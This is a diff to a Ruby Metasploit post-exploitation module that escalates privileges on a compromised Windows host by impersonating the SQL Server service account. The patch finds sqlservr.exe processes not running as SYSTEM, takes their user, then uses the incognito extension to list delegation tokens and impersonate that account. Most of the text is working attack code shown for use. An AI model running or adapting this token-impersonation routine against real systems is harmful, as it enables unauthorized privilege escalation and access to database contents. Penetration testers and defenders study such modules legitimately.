@@ -143,7 +143,7 @@ class Metasploit3 < Msf::Post
 
 					# Display results
 					service_instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
-					print_good("SQL Server service found: #{service_instance}")				
+					print_good("SQL Server instance found: #{service_instance}")				
 					return service_instance
 				end
 			else
@@ -447,13 +447,26 @@ class Metasploit3 < Msf::Post
 	## ----------------------------------------------
 	def impersonate_sql_user(service_instance,verbose)
 	
-		# Get all sqlservr.exe processes
-		# Filter out localsystem processes
-		# Get username of remaining process
-		# Set that username to service
+		print_status("Searching for sqlservr.exe processes not running as SYSTEM...")	
+
+		#define targetuser
+		targetuser = ""
+			
+		## Identify user running the SQL Server service process
+		session.sys.process.get_processes().each do |x|
+		
+			# Search for all sqlservr.exe processes
+			if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")
+				print_good("Found \"#{x['user']}\" running sqlservr.exe process")
+				targetuser = x['user']
+			end
+		end
 	
-		# Set target user to impersonate - makes assumption that service account is network service
-		targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
+		if targetuser == "" then
+			#fail
+			print_error("Unabled to find process")
+			return 0
+		end
 
 		# Load incognito
 		print_status("Attempting to load incognito...")
@@ -466,7 +479,7 @@ class Metasploit3 < Msf::Post
 			print_good("Sucessfully loaded incognito")
 		
 			# Parse delegation tokens
-			print_status("Searching for SQL 2012 deligation token...")
+			print_status("Searching for deligation \"#{targetuser}\" token...")
 			res = session.incognito.incognito_list_tokens(0)
 			if res
 				res["delegation"].split("\n").each do |user|
@@ -477,13 +490,13 @@ class Metasploit3 < Msf::Post
 						print_good("Found deligation token: #{user}")
 						
 						# Impersonate SQL Server user
-						print_status("Attempting to impersonate #{targetuser}...")
+						print_status("Attempting to impersonate \"#{targetuser}\"...")
 						if (targetuser != '')			
 							res = session.incognito.incognito_impersonate_token(targetuser)
-							print_good("Successfully impersonated #{targetuser}")
+							print_good("Successfully impersonated \"#{targetuser}\"")
 							return 1
 						else
-							print_error("Unabled to impersonate user: #{targetuser}")
+							print_error("Unabled to impersonate \"#{targetuser}\"")
 							return 0
 						end							
 					end				
